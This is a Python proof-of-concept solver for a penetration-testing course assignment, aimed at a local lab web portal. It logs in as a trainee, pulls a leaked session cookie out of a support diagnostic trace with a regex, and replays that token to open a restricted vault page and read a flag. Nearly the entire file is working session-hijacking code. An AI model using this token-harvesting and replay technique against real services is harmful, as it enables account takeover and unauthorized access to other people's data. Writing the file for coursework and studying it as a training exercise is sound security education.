#!/usr/bin/env python3
"""
Stage 2: Session Hijack - Automated Solver & Proof-of-Concept Exploit Script
IE3132 Penetration Testing - Assignment 02 (LO3 Deliverable)

This script automates the full penetration testing cycle for Stage 2:
1. Information Gathering & Initial Authentication (Junior Liaison)
2. Access Control Verification (Confirm 403 Forbidden on Vault)
3. Diagnostic Telemetry Inspection & Bearer Token Extraction
4. Session Replay Attack to recover the verification flag
"""

import http.cookiejar
import re
import sys
import urllib.parse
import urllib.request

TARGET_HOST = "http://127.0.0.1:8092"
BASE_PATH = "/session-hijack"
USERNAME = "trainee"
PASSWORD = "HorizonTrainee042!"

def main():
    print("=" * 65)
    print("  STAGE 2: SESSION HIJACK - AUTOMATED EXPLOITATION SCRIPT")
    print("  Target Outpost: Atlantis Surface-Liaison Portal (Sector 02)")
    print("=" * 65)

    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    # Step 1: Initial Authentication
    print("\n[*] [STEP 1] Authenticating with issued credentials...")
    login_url = f"{TARGET_HOST}{BASE_PATH}/login"
    login_data = urllib.parse.urlencode({"username": USERNAME, "password": PASSWORD}).encode()
    
    try:
        req = urllib.request.Request(login_url, data=login_data)
        with opener.open(req) as resp:
            print(f"[+] Login successful! Response code: {resp.status}")
    except Exception as e:
        print(f"[-] Login failed: {e}")
        sys.exit(1)

    # Step 2: Test Authorization Boundary on Vault
    print("\n[*] [STEP 2] Testing direct access to restricted Tide-Keeper Vault...")
    vault_url = f"{TARGET_HOST}{BASE_PATH}/vault"
    try:
        with opener.open(vault_url) as resp:
            print(f"[-] Unexpected access granted: {resp.status}")
    except urllib.error.HTTPError as e:
        if e.code == 403:
            print(f"[+] Access correctly denied! HTTP {e.code} Forbidden (Junior Liaison clearance insufficient).")
        else:
            print(f"[-] Unexpected error: {e.code}")

    # Step 3: Inspect Support Desk Diagnostic Attachment
    print("\n[*] [STEP 3] Inspecting diagnostic telemetry attachment (Ticket ATL-042)...")
    trace_url = f"{TARGET_HOST}{BASE_PATH}/support/trace-042.txt"
    try:
        with opener.open(trace_url) as resp:
            trace_content = resp.read().decode("utf-8")
            print("[+] Successfully downloaded telemetry trace:")
            for line in trace_content.splitlines():
                if "Cookie:" in line or "Authorization:" in line or "Ticket:" in line:
                    print(f"    {line}")
    except Exception as e:
        print(f"[-] Failed to fetch diagnostic trace: {e}")
        sys.exit(1)

    # Step 4: Extract Leaked Tide-Keeper Session Cookie
    print("\n[*] [STEP 4] Extracting unredacted bearer token from headers...")
    match = re.search(r"nh_portal_session=([0-9a-f]{64})", trace_content)
    if not match:
        print("[-] Failed to find session token in trace!")
        sys.exit(1)

    hijacked_token = match.group(1)
    print(f"[!] Vulnerability identified: Cookie header was not redacted by policy!")
    print(f"[+] Discovered Operator Session Token: {hijacked_token}")

    # Step 5: Execute Session Hijacking Replay Attack
    print("\n[*] [STEP 5] Executing session replay attack against /vault...")
    for cookie in jar:
        if cookie.name == "nh_portal_session":
            cookie.value = hijacked_token
            print(f"[+] Replaced local cookie 'nh_portal_session' with hijacked token.")

    try:
        with opener.open(vault_url) as resp:
            if resp.status == 200:
                html = resp.read().decode("utf-8")
                flag_match = re.search(r'id="flag"[^>]*>([^<]+)</code>', html)
                if flag_match:
                    flag = flag_match.group(1).strip()
                    print("\n" + "=" * 65)
                    print(f"  [+] EXPLOITATION SUCCESSFUL! HTTP 200 OK")
                    print(f"  [+] RECOVERED VERIFICATION FLAG: {flag}")
                    print("=" * 65 + "\n")
                else:
                    print("[!] Vault opened but flag element not parsed.")
            else:
                print(f"[-] Vault returned status {resp.status}")
    except Exception as e:
        print(f"[-] Session replay failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
